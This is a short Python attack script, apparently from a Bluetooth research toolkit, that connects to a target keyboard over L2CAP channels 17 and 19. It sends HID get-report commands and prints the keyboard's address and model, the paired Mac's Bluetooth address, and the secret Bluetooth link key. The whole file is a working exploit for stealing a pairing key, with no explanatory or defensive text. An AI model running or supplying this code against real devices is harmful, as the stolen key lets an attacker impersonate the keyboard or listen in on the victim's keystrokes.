#!/usr/bin/env python3

# import bluetooth
import binascii
import time
import sys
from injector.client import L2CAPClient
from injector.helpers import log, assert_address

if __name__ == "__main__":

  if len(sys.argv) < 2:
    print("Usage: ./read-link-key-bluetooth.py <KEYBOARD-BT-ADDR>")
    quit()

  addr = sys.argv[1]
  assert_address(sys.argv[1])

  c17 = L2CAPClient(addr, 17)
  c19 = L2CAPClient(addr, 19)

  while not c17.connected:
    c17.connect(timeout=1)
    time.sleep(0.001)

  c19.connect(timeout=1)

  def read_hid_report(id, flag=0):
    c17.send(bytes([0x53, 0xFF, id]))
    c17.recv(timeout=1)
    c17.send(bytes([0x43, 0xF0|flag]))
    return c17.recv(timeout=1)

  # read HID report 0x34 (BT address of keyboard and the product name)
  res = read_hid_report(0x34)
  accessory_bt_addr = ":".join("%02x" % c for c in res[6:12])
  accessory_model = bytes(res[15:]).decode().strip()

  # read HID report 0x35 (BT address of Mac and the link key)
  res = read_hid_report(0x35)
  mac_bt_addr = ":".join("%02x" % c for c in res[5:11])
  bt_link_key = binascii.hexlify(res[11:27][::-1]).decode()

  print("Model          - %s" % accessory_model)
  print("BT Address     - %s" % accessory_bt_addr)
  print("Mac BT Address - %s" % mac_bt_addr)
  print("BT Link Key    - %s" % bt_link_key)

  c17.close()
  c19.close()
